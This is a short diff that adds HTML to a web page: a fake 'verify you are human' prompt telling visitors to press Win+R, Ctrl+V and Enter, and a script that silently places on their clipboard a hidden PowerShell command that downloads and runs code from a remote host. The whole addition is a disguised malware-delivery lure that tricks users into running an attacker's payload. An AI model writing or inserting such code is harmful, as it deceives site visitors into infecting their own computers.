@@ -1,0 +1,3 @@
+<p>Verify you are human: press Win + R, then Ctrl + V, then Enter.</p>
+<script>navigator.clipboard.writeText("powershell -w hidden -c iwr http://example.invalid/a | iex");</script>
+
